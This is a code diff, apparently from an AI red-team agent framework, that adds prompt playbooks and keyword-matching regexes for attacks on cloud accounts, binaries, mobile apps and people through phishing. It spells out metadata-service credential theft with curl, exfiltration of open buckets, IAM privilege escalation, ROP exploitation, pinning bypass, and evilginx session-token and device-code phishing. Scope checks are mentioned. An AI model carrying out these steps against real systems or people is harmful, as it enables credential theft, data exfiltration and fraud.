@@ -276,10 +276,174 @@ AD_ATTACK_SKILL = Skill(
     ),
 )
 
-# The active skill set. Kept tiny on purpose; more skills (LFI, SSTI, cloud) slot
-# in here the same way.
+# --- Cloud (AWS/Azure/GCP/k8s). Keyword/metadata-driven — no single port tell. --- #
+_CLOUD_HINT_RE = re.compile(
+    r"\b(aws|azure|gcp|s3|ec2|iam|sts|lambda|cloud|bucket|blob|storage[-\s]?account|"
+    r"kubernetes|k8s|kubelet|kubectl|eks|aks|gke|metadata|imds|169\.254\.169\.254|"
+    r"metadata\.google|assume[-\s]?role|access[-\s]?key|service[-\s]?account|azurerm)\b",
+    re.IGNORECASE)
+
+
+def _is_cloud_target(state: Any, user_input: str) -> bool:
+    target = (getattr(state, "target", "") or "").lower()
+    if "169.254.169.254" in target or "metadata" in target:
+        return True
+    return bool(_CLOUD_HINT_RE.search(user_input or ""))
+
+
+CLOUD_ATTACK_SKILL = Skill(
+    name="cloud_attacks",
+    matches=_is_cloud_target,
+    body=(
+        "ACTIVE PLAYBOOK — a CLOUD target is in play (AWS/Azure/GCP/Kubernetes). Drive "
+        "provider CLIs via `shell` (aws/az/gcloud/kubectl); stay in the authorized "
+        "account/subscription/project.\n"
+        "1. WHOAMI + METADATA FIRST — if you have any foothold or SSRF, hit the metadata "
+        "service (IMDS) for credentials: AWS `curl http://169.254.169.254/latest/meta-"
+        "data/iam/security-credentials/<role>` (or IMDSv2: PUT a token first); GCP "
+        "`curl -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata"
+        "/v1/instance/service-accounts/default/token`; Azure IMDS `?api-version=2018-02-01"
+        "&resource=https://management.azure.com/`. Then `aws sts get-caller-identity` / "
+        "`az account show` / `gcloud auth list` to see who you are.\n"
+        "2. PUBLIC STORAGE — list/exfil open buckets: `aws s3 ls s3://<name> --no-sign-"
+        "request`, `aws s3 sync s3://<name> . --no-sign-request`; Azure blob `?comp=list`; "
+        "GCS `gsutil ls gs://<name>`. Enumerate names from the app/DNS.\n"
+        "3. IAM PRIVESC — enumerate your grants (`aws iam get-account-authorization-details`, "
+        "list attached policies) and look for the known escalation primitives: iam:Create"
+        "Policy(Version), sts:AssumeRole into a stronger role, lambda:UpdateFunctionCode, "
+        "iam:PassRole+ec2/lambda, glue/cloudformation. Azure: over-scoped RBAC, Managed "
+        "Identity abuse, `az role assignment list`. GCP: `iam.serviceAccounts.actAs`, "
+        "`setIamPolicy`, actAs+deploy.\n"
+        "4. KUBERNETES — `kubectl auth can-i --list`; hunt exposed kubelets (:10250 "
+        "`/run`/`/exec`), the dashboard, and mounted service-account tokens at "
+        "`/var/run/secrets/kubernetes.io/serviceaccount/token`; escape a pod to the node "
+        "with a privileged/hostPath spec.\n"
+        "PROOF = the actual retrieved credential/token, the object contents, or the "
+        "sts:get-caller-identity of the escalated principal — never a command you didn't run."
+    ),
+)
+
+
+# --- Binary exploitation / pwn (CTF-style). Keyword-driven. ------------------- #
+_PWN_HINT_RE = re.compile(
+    r"\b(binary|elf|pwn|pwntools|buffer[-\s]?overflow|stack[-\s]?overflow|heap[-\s]?"
+    r"overflow|\brop\b|ret2\w+|format[-\s]?string|shellcode|canary|\bnx\b|\bpie\b|\bgot\b|"
+    r"\bplt\b|libc|one[-\s]?gadget|ghidra|radare2|\br2\b|\bgdb\b|\bpwndbg\b|disassemble|"
+    r"decompile|reverse[-\s]engineer\w*|checksec|segfault)\b",
+    re.IGNORECASE)
+
+
+def _is_pwn_target(state: Any, user_input: str) -> bool:
+    return bool(_PWN_HINT_RE.search(user_input or ""))
+
+
+BINARY_PWN_SKILL = Skill(
+    name="binary_exploitation",
+    matches=_is_pwn_target,
+    body=(
+        "ACTIVE PLAYBOOK — BINARY EXPLOITATION / reverse engineering. Work it through "
+        "`shell`/`kali_run` with the standard toolchain.\n"
+        "1. TRIAGE — `file <bin>`, `checksec --file=<bin>` (note NX / PIE / canary / "
+        "RELRO), `strings`, and a quick `ghidra`/`r2 -A`/`objdump -d` pass to find "
+        "main + interesting functions (a win()/system() gadget, a gets()/strcpy()).\n"
+        "2. FIND THE PRIMITIVE — classic classes: stack buffer overflow (unbounded "
+        "read into a fixed buffer), format string (user input reaching printf → leak/"
+        "write with %p/%n), use-after-free/heap. Find the exact offset to saved RIP with "
+        "a cyclic pattern (`pwndbg` cyclic / cyclic_find).\n"
+        "3. BUILD THE EXPLOIT with pwntools: `from pwn import *`. If NX: ROP — leak libc "
+        "(puts@plt(puts@got)) → compute base → ret2system('/bin/sh') or a one_gadget. No "
+        "PIE + a win() → just overwrite RIP with its address. Mind the stack alignment "
+        "(movaps) — add a ret gadget if it crashes in system.\n"
+        "4. LOCAL THEN REMOTE — get it working on `p = process('./bin')`, then flip to "
+        "`p = remote(host, port)` for the real target. `p.interactive()` to read the flag.\n"
+        "PROOF = the flag actually returned by the exploited process — never a payload "
+        "you built but did not land."
+    ),
+)
+
+
+# --- Mobile (Android / iOS). Keyword-driven. --------------------------------- #
+_MOBILE_HINT_RE = re.compile(
+    r"\b(apk|android|ios|ipa|frida|objection|jadx|apktool|mobsf|smali|\bdex\b|"
+    r"ssl[-\s]?pinning|deep[-\s]?link|webview|exported[-\s]?(activity|component|provider)|"
+    r"mobile[-\s]?app|\.plist|keychain|content[-\s]?provider)\b",
+    re.IGNORECASE)
+
+
+def _is_mobile_target(state: Any, user_input: str) -> bool:
+    return bool(_MOBILE_HINT_RE.search(user_input or ""))
+
+
+MOBILE_ATTACK_SKILL = Skill(
+    name="mobile_attacks",
+    matches=_is_mobile_target,
+    body=(
+        "ACTIVE PLAYBOOK — MOBILE APP (Android/iOS) attack. Drive the toolchain via "
+        "`shell`/`kali_run`.\n"
+        "1. STATIC FIRST — Android: `apktool d app.apk` (manifest + smali) and `jadx -d "
+        "out app.apk` (Java). Read AndroidManifest.xml for exported activities/services/"
+        "receivers/providers (`android:exported=true`), deep-link schemes, "
+        "usesCleartextTraffic, and the networkSecurityConfig. Grep the decompiled source "
+        "for secrets/API keys/endpoints/hardcoded creds. iOS: unzip the .ipa, `class-dump`/"
+        "Hopper the binary, read Info.plist + embedded.mobileprovision.\n"
+        "2. EXPORTED-COMPONENT ABUSE — invoke exported components directly with `adb shell "
+        "am start`/`am startservice`/`content` (or a malicious app) to bypass auth, reach "
+        "internal screens, or hit an exported ContentProvider for SQLi/file read.\n"
+        "3. DYNAMIC — run with Frida/Objection: `objection -g <pkg> explore` for SSL-"
+        "pinning + root/jailbreak-detection bypass, or a custom `frida -U -f <pkg>` hook "
+        "to tamper with logic and dump runtime secrets. Proxy traffic (Burp) after "
+        "unpinning to test the API.\n"
+        "4. WEBVIEW — if a WebView loads attacker-influenced content with a JS bridge "
+        "(addJavascriptInterface), that bridge is RCE-in-app; test it.\n"
+        "PROOF = the actual secret/flag extracted or the concrete bypass demonstrated."
+    ),
+)
+
+
+# --- Social engineering / phishing. Keyword-driven; deconfliction-gated. ------ #
+_SE_HINT_RE = re.compile(
+    r"\b(phish\w*|spear[-\s]?phish\w*|gophish|evilginx|pretext\w*|social[-\s]engineer\w*|"
+    r"\blure\b|credential[-\s]harvest\w*|oauth[-\s]?device|device[-\s]?code|smishing|"
+    r"vishing|lookalike[-\s]?domain|typosquat\w*|pretexting)\b",
+    re.IGNORECASE)
+
+
+def _is_se_target(state: Any, user_input: str) -> bool:
+    return bool(_SE_HINT_RE.search(user_input or ""))
+
+
+SOCIAL_ENGINEERING_SKILL = Skill(
+    name="social_engineering",
+    matches=_is_se_target,
+    body=(
+        "ACTIVE PLAYBOOK — SOCIAL ENGINEERING / phishing (MITRE T1566). DECONFLICT FIRST: "
+        "confirm the campaign, sender domains, and target list are IN SCOPE and the blue "
+        "team is deconflicted BEFORE anything is sent — this is mandatory.\n"
+        "1. PRETEXT + INFRA — build a credible lure from OSINT (org, roles, current "
+        "events); register a lookalike/typosquat domain, warm it, and set SPF/DKIM/DMARC "
+        "so it lands. Host the phishing page and a redirector.\n"
+        "2. CREDENTIAL / TOKEN CAPTURE — GoPhish for classic credential-harvest campaigns "
+        "with tracked links. For MFA-protected targets use a reverse-proxy (evilginx2) to "
+        "capture the SESSION COOKIE/token, not just the password — a harvested password "
+        "alone won't beat MFA. For M365/Azure, the OAuth device-code flow is high-yield: "
+        "start a device-code auth and phish the user into entering the code.\n"
+        "3. PAYLOAD DELIVERY (if in scope) — ISO/LNK/HTA or a macro-less Office vector; "
+        "pair with a C2 the engagement authorizes. Otherwise stop at credential/token "
+        "capture and validated access.\n"
+        "4. VALIDATE — log in with the captured credential/token to PROVE access; note "
+        "who clicked/submitted for the report.\n"
+        "PROOF = a captured credential/session token you actually authenticated with, or "
+        "the recorded click/submit — never a lure you merely drafted."
+    ),
+)
+
+
+# The active skill set: Mapache's baked-in offensive playbooks across domains
+# (web, network service, credential, AD, cloud, binary, mobile, social engineering).
+# User/community additions load from SKILL.md files via core/skill_format.py.
 SKILLS: list[Skill] = [WEB_ATTACK_SKILL, NETWORK_ATTACK_SKILL, CREDENTIAL_ATTACK_SKILL,
-                       AD_ATTACK_SKILL]
+                       AD_ATTACK_SKILL, CLOUD_ATTACK_SKILL, BINARY_PWN_SKILL,
+                       MOBILE_ATTACK_SKILL, SOCIAL_ENGINEERING_SKILL]
 
 # File-authored skills (SKILL.md, loaded via core/skill_format.py) register here, so
 # an operator can drop a Markdown playbook into a skills/ dir and have it injected the
